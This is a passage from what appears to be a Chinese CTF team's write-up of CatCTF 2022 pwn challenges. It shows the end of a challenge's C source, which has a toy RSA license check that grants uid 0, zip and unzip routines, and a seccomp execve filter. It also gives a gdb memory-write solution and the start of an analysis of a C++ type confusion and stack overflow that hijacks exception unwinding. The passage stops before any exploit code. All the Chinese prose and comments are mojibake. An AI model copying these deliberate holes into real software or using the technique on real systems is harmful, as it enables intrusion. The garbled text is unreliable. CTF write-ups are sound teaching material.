å¯†å‡½æ•°</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">int</span> e,<span class="type">int</span> n)</span>&#123;       <span class="comment">//è‡ªå·±æŒ‡å®šæŒ‡æ•°e</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//å…ˆå°†ç¬¦å·æ˜æ–‡è½¬æ¢æˆå­—æ¯æ‰€å¯¹åº”çš„asciiç ã€‚</span></span><br><span class="line">    <span class="type">char</span> mingwen[<span class="number">100</span>];    <span class="comment">//ç¬¦å·æ˜æ–‡</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥CDKï¼š\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>,mingwen);</span><br><span class="line">    getchar();</span><br><span class="line">    changdu=<span class="built_in">strlen</span>(mingwen);</span><br><span class="line">    <span class="type">int</span> ming[<span class="built_in">strlen</span>(mingwen)];   <span class="comment">//å®šä¹‰ç¬¦å·æ˜æ–‡</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(mingwen);i++)&#123;</span><br><span class="line">    ming[i]=mingwen[i];        <span class="comment">//å°†å­—æ¯è½¬æ¢æˆå¯¹åº”çš„asciiç ã€‚</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="comment">//å¼€å§‹åŠ å¯†</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;startâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> zhuan=<span class="number">1</span>;    <span class="comment">//cä¸ºåŠ å¯†åçš„æ•°å­—å¯†æ–‡</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(mingwen);i++)&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;e;j++)&#123;</span><br><span class="line">        zhuan=zhuan*ming[i]%n;</span><br><span class="line">        <span class="comment">//zhuan=zhuan%n;</span></span><br><span class="line">       &#125;</span><br><span class="line">       c[i]=zhuan;</span><br><span class="line">       <span class="comment">//printf(&quot;%d&quot;,mi[i]);</span></span><br><span class="line">       zhuan=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(c[<span class="number">0</span>]!=<span class="number">149</span>||c[<span class="number">1</span>]!=<span class="number">108</span>||c[<span class="number">2</span>]!=<span class="number">24</span>)<span class="comment">//14910824</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        uid=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">zip</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* file;</span><br><span class="line">    uLong flen;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* fbuf = <span class="literal">NULL</span>;</span><br><span class="line">    uLong clen;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* cbuf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> fileName[<span class="number">0x2560</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%2560s&quot;</span>,fileName);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((file = fopen(fileName, <span class="string">&quot;rb&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Can\&#x27;t open %s!\n&quot;</span>, fileName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* è£…è½½æºæ–‡ä»¶æ•°æ®åˆ°ç¼“å†²åŒº */</span></span><br><span class="line">    fseek(file, <span class="number">0L</span>, SEEK_END);    <span class="comment">/* è·³åˆ°æ–‡ä»¶æœ«å°¾ */</span></span><br><span class="line">    flen = ftell(file);        <span class="comment">/* è·å–æ–‡ä»¶é•¿åº¦ */</span></span><br><span class="line">    fseek(file, <span class="number">0L</span>, SEEK_SET);</span><br><span class="line">    <span class="keyword">if</span>((fbuf = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>) * flen)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No enough memory!\n&quot;</span>);</span><br><span class="line">        fclose(file);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fread(fbuf, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>), flen, file);</span><br><span class="line">    <span class="comment">/* å‹ç¼©æ•°æ® */</span></span><br><span class="line">    clen = compressBound(flen);</span><br><span class="line">    <span class="keyword">if</span>((cbuf = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>) * clen)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No enough memory!\n&quot;</span>);</span><br><span class="line">        fclose(file);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(compress(cbuf, &amp;clen, fbuf, flen) != Z_OK)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Compress %s failed!\n&quot;</span>, fileName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;zip file&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%2560s&quot;</span>,fileName);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span>((file = fopen(fileName, <span class="string">&quot;wb&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Can\&#x27;t create %s!\n&quot;</span>, fileName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* ä¿å­˜å‹ç¼©åçš„æ•°æ®åˆ°ç›®æ ‡æ–‡ä»¶ */</span></span><br><span class="line">    fwrite(&amp;flen, <span class="keyword">sizeof</span>(uLong), <span class="number">1</span>, file);    <span class="comment">/* å†™å…¥æºæ–‡ä»¶é•¿åº¦ */</span></span><br><span class="line">    fwrite(&amp;clen, <span class="keyword">sizeof</span>(uLong), <span class="number">1</span>, file);    <span class="comment">/* å†™å…¥ç›®æ ‡æ•°æ®é•¿åº¦ */</span></span><br><span class="line">    fwrite(cbuf, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>), clen, file);</span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(fbuf);</span><br><span class="line">    <span class="built_in">free</span>(cbuf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">unzip</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* file;</span><br><span class="line">    uLong flen;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* fbuf = <span class="literal">NULL</span>;</span><br><span class="line">    uLong ulen;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* ubuf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> fileName[<span class="number">0x2560</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;zip file&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%1s&quot;</span>,fileName);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span>((file = fopen(fileName, <span class="string">&quot;rb&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Can\&#x27;t open %s!\n&quot;</span>, fileName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* è£…è½½æºæ–‡ä»¶æ•°æ®åˆ°ç¼“å†²åŒº */</span></span><br><span class="line">    fread(&amp;ulen, <span class="keyword">sizeof</span>(uLong), <span class="number">1</span>, file);   <span class="comment">/* è·å–ç¼“å†²åŒºå¤§å° */</span></span><br><span class="line">    fread(&amp;flen, <span class="keyword">sizeof</span>(uLong), <span class="number">1</span>, file);   <span class="comment">/* è·å–æ•°æ®æµå¤§å° */</span></span><br><span class="line">    <span class="keyword">if</span>((fbuf = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>) * flen)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No enough memory!\n&quot;</span>);</span><br><span class="line">        fclose(file);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fread(fbuf, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>), flen, file);</span><br><span class="line">    <span class="comment">/* è§£å‹ç¼©æ•°æ® */</span></span><br><span class="line">    <span class="keyword">if</span>((ubuf = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>) * ulen)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No enough memory!\n&quot;</span>);</span><br><span class="line">        fclose(file);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(uncompress(ubuf, &amp;ulen, fbuf, flen) != Z_OK)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Uncompress %s failed!\n&quot;</span>, fileName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;unzip file&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%1s&quot;</span>,fileName);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span>((file = fopen(fileName, <span class="string">&quot;wb&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Can\&#x27;t create %s!\n&quot;</span>, fileName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* ä¿å­˜è§£å‹ç¼©åçš„æ•°æ®åˆ°ç›®æ ‡æ–‡ä»¶ */</span></span><br><span class="line">    fwrite(ubuf, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>), ulen, file);</span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(fbuf);</span><br><span class="line">    <span class="built_in">free</span>(ubuf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sandbox</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="number">4</span>),</span><br><span class="line">    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="number">0xc000003e</span>,<span class="number">0</span>,<span class="number">2</span>),</span><br><span class="line">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="number">0</span>),</span><br><span class="line">    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="number">59</span>,<span class="number">0</span>,<span class="number">1</span>),</span><br><span class="line">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span><br><span class="line">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">    .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter)/<span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">    .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    sandbox();</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">buy</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    encrypt(<span class="number">7</span>,<span class="number">221</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.zip&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.unzip&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3.buy root&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="type">int</span> choice;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">switch</span>(choice)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:zip();<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">if</span>(uid==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                unzip();</span><br><span class="line">            &#125;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:buy();<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="welcome-cat-ctfğŸ‰"><a href="#welcome-cat-ctfğŸ‰" class="headerlink" title="welcome_cat_ctfğŸ‰"></a>welcome_cat_ctfğŸ‰</h3><p>gdbä¿®æ”¹glodå˜é‡<br>set *0x55555575e388&#x3D;0x8888888<br>ç„¶åç§»åŠ¨åˆ°@ä¸‹é¢æŒ‰ä¸‹jï¼Œå‘æœåŠ¡å™¨å‘é€flagè·å–è¯·æ±‚å³å¯å¾—åˆ°flag</p>
<h3 id="chao-ğŸŒ¿"><a href="#chao-ğŸŒ¿" class="headerlink" title="chao ğŸŒ¿"></a>chao ğŸŒ¿</h3><p>æ„Ÿè°¢winmtå¸ˆå‚…æŠ•é€’çš„é¢˜ç›®</p>
<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>é¦–å…ˆï¼Œç¥å„ä½å¸ˆå‚…ä»¬å…ƒæ—¦å¿«ä¹ï¼Œ2023æ–°çš„ä¸€å¹´æŒ–æ´å¦‚æ°´å–ï¼Œæ‹¿shellæ‹¿åˆ°æ‰‹è½¯ï¼</p>
<p>å…¶å®ï¼Œè¿™ä¸ªé¢˜æˆ‘è‡ªå·±ä¹Ÿæ²¡æ„Ÿè§‰å¾ˆéš¾ï¼Œæ›´æ²¡æƒ³åˆ°åœ¨è¿™æ¬¡CATCTFè·¨å¹´èµ›ä¸Šèƒ½åšæŒºåˆ°æœ€åï¼Œæˆä¸ºPwnæ–¹å‘å”¯ä¸€ä¸€ä¸ªé›¶è§£çš„é¢˜ï¼Œåº”è¯¥æ˜¯å¸ˆå‚…ä»¬éƒ½å¿™ç€è·¨å¹´é™ªå¯¹è±¡äº†å‘œå‘œå‘œã€‚å¦‚æœæœ‰å¸ˆå‚…åœ¨è¿™é¢˜ä¸ŠèŠ±äº†å¤ªå¤šæ—¶é—´ï¼Œå½±å“äº†æ–°å¹´çš„å¥½å¿ƒæƒ…ï¼Œwinmtåœ¨æ­¤è·ªä¸‹QAQ</p>
<p>æœ¬é¢˜åœ¨æ¼æ´æŒ–æ˜æ–¹é¢ï¼Œè€ƒå¯Ÿäº†å»é™¤ç¬¦å·è¡¨çš„C++ç¨‹åºé€†å‘æ¢å¤ ä»¥åŠ C++ä¸­å¸¸è§çš„ç”±è™šå‡½æ•°å¼•èµ·çš„ç±»å‹æ··æ·†æ¼æ´ã€‚æœ¬é¢˜ä»£ç é‡å¹¶ä¸å¤§ï¼Œè™½ç„¶å»é™¤äº†ç¬¦å·è¡¨ï¼Œä½†æ˜¯é€†å‘æ€è·¯æ•´ä½“è¿˜æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ã€‚å¼„æ¸…é€»è¾‘åï¼Œç±»å‹æ··æ·†æ¼æ´åº”è¯¥ä¹Ÿä¸éš¾å‘ç°ã€‚ä¸»è¦è€ƒå¯Ÿç‚¹åœ¨æ¼æ´åˆ©ç”¨æ–¹é¢ï¼Œå¾ˆå®¹æ˜“å‘ç°æœ‰æ ˆæº¢å‡ºï¼Œä½†æ˜¯å¹¶ä¸å¥½åˆ©ç”¨ï¼Œæ­¤å¤„éœ€è¦äº†è§£C++å¼‚å¸¸å¤„ç†çš„æ ˆå›é€€æœºåˆ¶ã€‚å…³äºC++å¼‚å¸¸æœºåˆ¶çš„Pwné¢˜å…¶å®å¾ˆæ—©å°±å‡ºç°è¿‡ï¼Œä¹Ÿå¹¶ä¸æ–°å¥‡ï¼Œä½†æ˜¯æœ¬é¢˜åœ¨catchåˆ°å¼‚å¸¸åï¼Œç›´æ¥é€€å‡ºäº†ç¨‹åºï¼Œä¹Ÿä¸å¥½ç»•è¿‡canaryä¿æŠ¤ï¼Œæ— æ³•æ ˆæº¢å‡ºã€‚ä¸è¿‡å¯è°ƒè¯•å‘ç°ï¼Œèƒ½å¤Ÿé€šè¿‡æ ˆæº¢å‡ºåŠ«æŒåˆ°å¼‚å¸¸å¤„ç†ä¸­è°ƒç”¨çš„å‡½æ•°æŒ‡é’ˆï¼Œç»§è€Œé€šè¿‡æ ˆè¿ç§»å®Œæˆåˆ©ç”¨ã€‚</p>
<p>ä¸‹é¢ç»™å„ä½å¸ˆå‚…ä»¬å‘ˆä¸Šæœ¬é¢˜çš„WriteUpï¼Œå¯¹æœ¬é¢˜æœ‰ä»»ä½•å…¶ä»–æƒ³æ³•çš„å¸ˆå‚…ï¼Œä¹Ÿéƒ½æ¬¢è¿æ‰¾æˆ‘ä¸€èµ·äº¤æµ~</p>
<h4 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h4><p>æœ¬é¢˜æ˜¯ä¸€é“32ä½çš„C++ Pwné¢˜ï¼Œå¹¶ä¸”ä¿æŠ¤å…¨å¼€ã€å»é™¤äº†ç¬¦å·è¡¨ã€‚å› æ­¤ï¼Œéœ€è¦å…ˆæ‰¾åˆ°ç±»çš„è™šè¡¨ï¼Œæ–¹ä¾¿ä¹‹åå¯¹ç±»çš„é€†å‘æ¢å¤ï¼š</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/1_fC-s9nzEUu.png" class="">

<p>é€šè¿‡startæ‰¾åˆ°mainå‡½æ•°ä¹‹åï¼Œå‘ç°ç›´æ¥åç¼–è¯‘ä¼šæœ‰é—®é¢˜ï¼ˆç–‘ä¼¼IDAçš„bugï¼‰ï¼Œå°†æŠ¥é”™çš„0x1FF5å¤„ï¼ˆcoutçš„ä¸€éƒ¨åˆ†ï¼‰nopæ‰å³å¯æˆåŠŸåç¼–è¯‘mainå‡½æ•°ï¼š</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2_dz-lCoA9Ji.png" class="">

<p>å¯ä»¥çœ‹åˆ°æœ¬é¢˜å¼€å¯äº†æ²™ç›’ï¼Œä¸è¿‡ç”±äºå…¶ä»–è€ƒç‚¹è¾ƒå¤šï¼Œå°±æ²¡æœ‰åœ¨æ²™ç›’è€ƒå¯Ÿä¸Šå¢åŠ éš¾åº¦äº†ï¼Œåªç¦ç”¨äº†execveï¼š</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/3_RCNEkVPNeC.png" class="">

<p>åˆ›å»ºåŠŸèƒ½ï¼šæœ€å¤šåˆ›å»º10æ¬¡ï¼Œæ¯æ¬¡å¯ä»¥åˆ›å»º0å’Œ1ä¸¤ç§å¯¹è±¡å­˜æ”¾æ•°æ®ï¼Œæ•°æ®çš„å¤§å°ä¸èƒ½è¶…è¿‡0x100ã€‚ ï¼ˆ1ï¼‰åˆ›å»ºç±»å‹ä¸º0çš„å¯¹è±¡ï¼Œé¦–å…ˆç”³è¯·ä¸€ä¸ªå †å—ï¼Œå°†Class_oneçš„è™šè¡¨åœ°å€æ”¾åœ¨å †å—å¤´ï¼Œè¾“å…¥çš„å†…å®¹é•¿åº¦å­˜åœ¨åç§»0x4çš„ä½ç½®ï¼Œè¾“å…¥çš„å†…å®¹é€šè¿‡strdupç”³è¯·çš„æŒ‡é’ˆå­˜æ”¾åœ¨0x8çš„ä½ç½®ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œstrdupè°ƒç”¨äº†strlenè·å–é•¿åº¦ï¼Œå› æ­¤<strong>è¾“å…¥çš„å†…å®¹ç›¸å½“äºä¼šè¢«\x00æˆªæ–­</strong>ï¼š</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/4_Q5j54rByUS.png" class="">

<p>åˆ›å»ºç±»å‹ä¸º1çš„å¯¹è±¡ï¼ŒåŒæ ·ä¼šç”³è¯·ä¸€ä¸ªå †å—ï¼Œå°†Class_twoçš„è™šè¡¨åœ°å€æ”¾åœ¨å †å—å¤´ï¼Œè¾“å…¥çš„å†…å®¹é•¿åº¦å­˜åœ¨åç§»0x4çš„ä½ç½®ï¼Œä¸è¿‡è¿˜ä¼šåˆåˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨è¯¥å¯¹è±¡ä¸­å­˜æ”¾è¾“å…¥å†…å®¹çš„é•¿åº¦ä»¥åŠé€šè¿‡strdupä¸ºè¾“å…¥çš„å†…å®¹ç”³è¯·çš„å †å—åœ°å€ï¼Œå¹¶å°†è¯¥å¯¹è±¡å­˜æ”¾åœ¨ä¸ºClass_twoåˆ›å»ºçš„å †å—åç§»0x8çš„ä½ç½®ã€‚</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/5_kE-HBzJpVv.png" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/6_Cb5ZYA3S_u.png" class="">

<p>æ›´æ–°åŠŸèƒ½ï¼šä¸è®ºæ˜¯Class_oneè¿˜æ˜¯Class_twoçš„å¯¹è±¡ï¼Œéƒ½ä¼šè°ƒç”¨Class_oneè™šè¡¨ä¸­çš„sub_2290å‡½æ•°ï¼Œç”±æ­¤å¯ä»¥åˆ¤æ–­ï¼šClass_twoæ˜¯Class_oneçš„æ´¾ç”Ÿç±»ã€‚åœ¨sub_2290å‡½æ•°ä¸­ï¼Œä¼šé‡Šæ”¾æ‰åç§»ä¸º0x8å¤„çš„å †å—ï¼Œæ›´æ–°é•¿åº¦ï¼Œå¹¶é€šè¿‡strdupä¸ºæ–°è¾“å…¥çš„å†…å®¹äº§ç”Ÿæ–°çš„å †å—å­˜æ”¾åœ¨åç§»0x8å¤„ã€‚æ­¤å¤„å­˜åœ¨ä¸€ä¸ª<strong>ç±»å‹æ··æ·†æ¼æ´</strong>ï¼šsub_2290å‡½æ•°æ˜æ˜¾åªæ˜¯é’ˆå¯¹Class_oneçš„æ“ä½œï¼Œè€ŒClass_twoæ›´æ–°çš„æ—¶å€™ä¹Ÿä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ•…äº§ç”Ÿäº†ç±»å‹æ··æ·†ï¼Œ<strong>å¯åˆ©ç”¨æ­¤å¤„æ¼æ´æ§åˆ¶sizeå’Œbufåœ°å€</strong>ã€‚</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/7_8_JsPy6pkb.png" class="">

<p>è¾“å‡ºåŠŸèƒ½ï¼šå‡ä¼šè°ƒç”¨Class_oneç±»è™šè¡¨ä¸­çš„sub_22EAå‡½æ•°ï¼Œå…¶ä¸­è·å–sizeçš„æ—¶å€™ï¼Œä¼šåˆ†å¸ƒè°ƒç”¨Class_oneå’ŒClass_twoå„è‡ªè™šè¡¨ä¸­çš„ç›¸åº”å‡½æ•°ï¼š</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/8_FQ4UuUet20.png" class="">

<p>å…¶ä¸­ï¼ŒClass_oneä¼šç”¨strlenè·å–åç§»ä¸º0x8å¤„çš„bufçš„é•¿åº¦ï¼Œè€ŒClass_twoä¼šè·å–åç§»ä¸º8å¤„çš„å¯¹è±¡ä¸­å¼€å¤´çš„sizeï¼Œè¿™æ›´å‘¼åº”äº†ä¸Šä¸€ç‚¹çš„ç±»å‹æ··æ·†æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/9_6fjYIGlA2c.png" class="">

<p>è¿™é‡Œä¹‹åè°ƒç”¨allocaåŠ¨æ€åˆ†é…æ ˆï¼Œåˆ†é…çš„å¤§å°æ˜¯size+10ï¼Œç„¶åé¦–å…ˆstrcpyåˆ°æ ˆä¸Šâ€Content: â€œå­—ç¬¦ä¸²9ä¸ªå­—èŠ‚ï¼Œå†å°†éœ€è¦è¾“å‡ºçš„å†…å®¹ä»å¯¹è±¡ä¸­çš„bufåŒºåŸŸï¼ˆè¿™é‡Œä¸ä¸Šé¢è·å–sizeç±»ä¼¼ï¼ŒClass_oneç›´æ¥è·å–åç§»0x8å¤„çš„bufï¼ŒClass_twoä¼šè·å–åç§»ä¸º8å¤„çš„å¯¹è±¡ä¸­åç§»ä¸º4çš„bufï¼Œå¯é€šè¿‡ç±»å‹æ··æ·†æ¼æ´åˆ©ç”¨ï¼‰strcatåˆ°æ ˆä¸Šä¹‹åçš„åŒºåŸŸï¼ˆå­˜åœ¨<strong>ç¼“å†²åŒºæº¢å‡º</strong>ï¼‰ã€‚</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/10_as7YYrSuo3.png" class="">

<p>ä¸è¿‡ï¼Œè‹¥æ˜¯strcatä¹‹åbufçš„é•¿åº¦å¤§äºlength-1ï¼ˆè¿™é‡Œå¯<strong>åˆ©ç”¨è®¡ç®—æœºè¡¥ç é€ æˆæ•´å‹æº¢å‡º</strong>ï¼‰ï¼Œåˆ™ä¼šç”¨C++å¼‚å¸¸å¤„ç†ä¸­çš„throwæŠ›å‡ºé”™è¯¯ï¼Œå¦åˆ™å°†bufè¾“å‡ºå‡ºæ¥ï¼š</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/11_U2lmvAoU24.png" class="">

<p>C++å¼‚å¸¸å¤„ç†çš„catchéƒ¨åˆ†åœ¨0x204Cå¤„ï¼Œä¼šè¾“å‡ºError!å¹¶é€šè¿‡exit(-1)ç»“æŸç¨‹åºï¼š</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/12_RCUTyKXG70.png" class="">

